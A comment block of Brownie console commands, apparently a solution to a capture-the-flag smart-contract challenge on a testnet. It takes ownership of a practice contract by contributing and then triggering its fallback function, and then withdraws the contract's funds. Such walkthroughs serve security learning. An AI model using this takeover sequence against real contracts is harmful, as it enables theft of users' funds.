/*

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")
 
# calculate function selector for contribute()

web3.keccak(text="contribute")[0:4]  // returns the 4-bytes function selector

# call contribute() with .0000001 ether

accounts[0].transfer(to="contract address",amount='.000001 ether',data='0xd7bb99ba')

# send ether to the fallback function to pass the require logic and set ourself as owner

accounts[0].transfer(to="contract address",amount='.000001 ether')

# confirm that your address is the owner. owner state variable at storage address 1

web3.eth.getStorageAt("contract address",1)

# call the withdraw function

accounts[0].transfer(to="contract address",data=web3.keccak(text='withdraw()')[0:4])

# submit your instance


*/

